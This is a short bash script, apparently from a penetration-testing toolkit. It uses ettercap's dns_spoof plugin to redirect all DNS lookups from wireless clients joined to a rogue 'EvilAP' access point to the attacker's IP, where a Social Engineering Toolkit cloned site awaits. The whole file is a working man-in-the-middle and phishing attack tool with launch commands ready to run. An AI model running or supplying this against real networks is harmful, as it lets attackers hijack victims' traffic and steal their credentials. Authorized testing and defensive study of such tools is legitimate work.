#!/bin/bash
# Script to use ettercap to redirect all DNS traffic back to the device
# Use with SET (site cloner)
#set the prompt to the name of the script
PS1=${PS1//@\\h/@dnsspoof}
clear

. /opt/pwnix/pwnpad-scripts/px_functions.sh

if loud_one=1 f_validate_one at0; then

f_banner(){
  printf "\nEvilAP Ettercap-NG 0.8.0 DNS Spoofing Tool\n\n"
  printf "[!] This only works when EvilAP is running!\n"
  printf "[!] Monitor mode (at0) must be active!\n\n"
  printf "[-] All DNS requests from wireless clients connected to EvilAP will be redirected to IP of EvilAP (192.168.7.1)\n\n"
  printf "[+] Use with Social Engineering Toolkit\n"
  printf "[-] (site cloner uses 192.168.7.1)\n\n"
}

f_run(){
  f_banner

  #ettercap fails if the interface is down
  ip link set at0 up

  ettercap -i at0 -T -q -P dns_spoof
}

f_run
fi
